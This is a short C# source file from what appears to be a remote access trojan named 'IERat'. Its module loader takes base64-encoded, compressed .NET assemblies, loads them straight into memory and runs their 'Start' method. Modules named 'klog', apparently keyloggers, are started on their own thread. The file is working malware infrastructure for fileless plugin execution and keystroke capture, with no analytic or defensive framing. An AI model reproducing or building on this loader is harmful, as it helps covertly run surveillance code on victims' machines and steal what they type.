using System;
using System.Reflection;
using System.Threading;

namespace IERat.lib
{
    class Modules
    {
        public static object LoadModule(string ModuleData)
        {
            Assembly assembly = Assembly.Load(Utils.Decompress(Convert.FromBase64String(ModuleData)));
            var TypesEnumerator = assembly.ExportedTypes.GetEnumerator();
            TypesEnumerator.MoveNext();
            var Type = TypesEnumerator.Current;
            //var ClassInstance = Activator.CreateInstance(Type);
            var Start = Type.GetMethod("Start");
            if (Type.Name.Contains("klog"))
            {
                Thread ModuleThreadTest = new Thread(() => StartMethod(Start));
                return ModuleThreadTest;
            }
            else
            {
                return Start;
            }
        }
        public static void StartMethod(MethodInfo methodInfo)
        {
            methodInfo.Invoke(null, null);
        }
    }
}
